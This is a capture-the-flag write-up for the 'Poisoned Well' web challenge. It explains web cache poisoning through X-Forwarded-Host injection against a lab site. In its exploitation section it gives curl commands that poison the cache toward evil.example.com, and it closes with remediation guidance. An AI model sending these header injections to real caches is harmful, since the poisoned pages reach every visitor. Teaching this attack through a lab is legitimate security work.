# Poisoned Well

**Category:** Web
**Challenge:** Poisoned Well
**CTF:** Pointer Overflow CTF 2026
**Points:** 95 (WEB 300, Wave 2)
**Result:** Solved

**Flag:**

~~~text
poctf{...}
~~~

---

## 1. Reconnaissance

"The Daily Whatever" is a newspaper-style web application sitting behind a response cache (nginx). The challenge page reveals:

- Cache is keyed on request path only
- Responses are cached for 60 seconds
- The site generates a `<link rel="canonical">` tag from the request hostname
- A `/verify` endpoint checks if the cache has been poisoned
- A `/reset` endpoint clears the cache

---

## 2. Identifying the Vulnerability

The canonical link tag dynamically reflects the request's hostname:

~~~html
<link rel="canonical" href="https://poisoned-well.pointeroverflowctf.com/">
~~~

The article text on the page hints: "See the canonical link in the page metadata; we forward submissions to that URL." This strongly suggests **Web Cache Poisoning via X-Forwarded-Host header injection**.

The cache keys on the URL path but does NOT key on the `X-Forwarded-Host` header, creating a cache key collision: a request with a poisoned host header generates a response that gets cached and served to all subsequent visitors.

---

## 3. Exploitation

### Step 1: Reset the cache

~~~bash
curl -b "$COOKIE" "https://poisoned-well.pointeroverflowctf.com/reset"
# {"message":"Your cache is empty.","ok":true}
~~~

### Step 2: Poison the cache with X-Forwarded-Host

~~~bash
curl -b "$COOKIE" \
  -H "X-Forwarded-Host: evil.example.com" \
  "https://poisoned-well.pointeroverflowctf.com/"
~~~

The response contains the poisoned canonical link:

~~~html
<link rel="canonical" href="https://evil.example.com/">
<link rel="alternate" href="https://evil.example.com/rss.xml">
<meta property="og:url" content="https://evil.example.com/">
~~~

This response is cached (X-Cache: MISS on first request, HIT for subsequent).

### Step 3: Verify and collect the flag

~~~bash
curl -b "$COOKIE" "https://poisoned-well.pointeroverflowctf.com/verify"
# {"cached_host":"evil.example.com/",
#  "flag":"poctf{...}",
#  "message":"Cache has been poisoned..."}
~~~

---

## 4. Attack Path Summary

~~~text
/reset -> clear cache
    |
GET / with X-Forwarded-Host: evil.example.com
    |  -> canonical link reflects evil.example.com
    |  -> cached response (60s TTL)
    |
/verify -> confirms cache poisoned -> FLAG
~~~

---

## 5. Lessons Learned

| # | Finding | Key Takeaway |
|---|---|---|
| 1 | Cache keyed only on URL path, not on X-Forwarded-Host | Unkeyed headers that influence response content are the root cause of web cache poisoning |
| 2 | Canonical link reflected the forwarded host | Dynamic content derived from request headers must be keyed or excluded from cache |
| 3 | Single request was enough to poison | No brute force or race condition needed; one well-crafted request poisons the cache for all visitors |
| 4 | The newspaper metaphor telegraphed the attack | "Can't stop repeating itself" = cache replay; "making assumptions" = trusting unkeyed headers |

---

## 6. MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP-ID |
|-------|--------|-----------|--------|
| Initial Access | TA0001 | Exploit Public-Facing Application | T1190 |
| Impact | TA0040 | Defacement | T1491.002 |
| Resource Development | TA0042 | Stage Capabilities: Link Target | T1608.005 |
| Persistence | TA0003 | Server Software Component: Web Shell (via cached redirection) | T1505.003 |

---

## 7. Remediation and Containment

### Technical Fixes

1. Include `X-Forwarded-Host` and any other request headers that influence response content in the cache key (Vary header)
2. Strip or ignore untrusted proxy headers (`X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Original-URL`) at the edge unless explicitly needed
3. Generate canonical URLs from server-side configuration, not from client-supplied headers
4. Implement cache key normalization and audit unkeyed inputs regularly

### OWASP Top 10

- **A05:2021 Security Misconfiguration:** the caching layer accepted and reflected unkeyed headers without validation
- **A08:2021 Software and Data Integrity Failures:** cached responses served poisoned content to all visitors without integrity verification

### MITRE D3FEND Countermeasures

- **D3-NTF (Network Traffic Filtering):** strip dangerous headers at the reverse proxy before they reach the application
- **D3-WSAA (Web Session Activity Analysis):** detect anomalous header injection patterns in incoming requests
- **D3-CHM (Content Hash Mapping):** verify the integrity of cached responses before serving

### NIST CSF 2.0

- **Protect (PR.DS):** ensure data integrity of cached resources; validate that responses match expected origin
- **Detect (DE.CM):** monitor for unexpected changes in cached content, especially canonical URLs and meta tags
- **Respond (RS.AN):** investigate cache poisoning incidents to identify scope and impacted users

### NIST SP 800-53 Rev. 5

- **SC-8 (Transmission Confidentiality and Integrity):** protect the integrity of data in transit, including cached responses
- **SI-10 (Information Input Validation):** validate all request headers that influence response generation
- **CM-7 (Least Functionality):** disable or restrict cache configurations that accept unkeyed headers
- **SI-4 (Information System Monitoring):** monitor caching infrastructure for anomalous behavior

---

Thanks guys!! (❍ᴥ❍ʋ)

---

Web cache poisoning is a real-world threat that catches a lot of production sites off guard. If this writeup gave you new insights, share it and let's keep the conversation going.

- Instagram: https://www.instagram.com/uniaogeek
- LinkedIn: http://linkedin.com/in/mrhenrike
- X: https://x.com/mrhenrike
